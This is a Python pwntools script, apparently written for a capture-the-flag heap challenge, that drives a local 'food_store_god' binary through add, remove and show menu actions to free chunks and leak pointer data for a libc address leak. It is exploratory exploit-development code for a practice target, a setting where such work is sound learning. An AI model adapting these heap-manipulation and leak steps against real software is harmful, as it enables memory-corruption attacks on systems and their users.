import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
os.environ['LOG']='error'
from pwn import *
DIR='/mnt/c/Users/ha/Downloads/pwn'
p=process([DIR+'/ld-2.24.so','--library-path',DIR,DIR+'/food_store_god'],env={'LD_LIBRARY_PATH':DIR})
def ru(x,**k): return p.recvuntil(x,**k)
def sl(x): p.sendline(x if isinstance(x,bytes) else str(x).encode())
ru(b'Your name: '); sl(b'AAAA')
def add(title,ings=(b'0',)):
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'1'); ru(b'Magic : '); m=p.recvline().strip()
    ru(b'Title :'); sl(title)
    for i,ing in enumerate(ings):
        ru(b'Choose ingredient :'); sl(ing); ru(b'Add more ingredient ? (1/Yes,2/No) : '); sl(b'1' if i<len(ings)-1 else b'2')
    ru(b'Your choice: '); sl(b'4'); return m
def make(nm):
    ru(b'Your choice: '); sl(b'4'); ru(b'Your choice: '); sl(b'3'); ru(b'Ingredient :'); sl(nm); ru(b'Your choice: '); sl(b'4')
def rm(t): ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'2'); ru(b'Title :'); sl(t); ru(b'Your choice: '); sl(b'4')
def show():
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'3')
    import time; time.sleep(0.3); d=p.recvrepeat(0.8)
    # return to main if alive
    return d
add(b'A1'); add(b'B2'); add(b'YY'); add(b'W3'); make(b'bar')
rm(b'B2'); rm(b'W3'); rm(b'A1'); rm(b'YY'); add(b'CC')
d=show()
import re
titles=re.findall(rb'Title : ([^\n]*)', d)
for t in titles: print("title:", t, t.hex())
print("alive after show?", p.poll() is None)
if p.poll() is None:
    # try drain unsorted then re-leak for libc: do 3 makes BEFORE rm YY ideally; here just report
    print("STILL ALIVE -> clean leak!")
p.close()
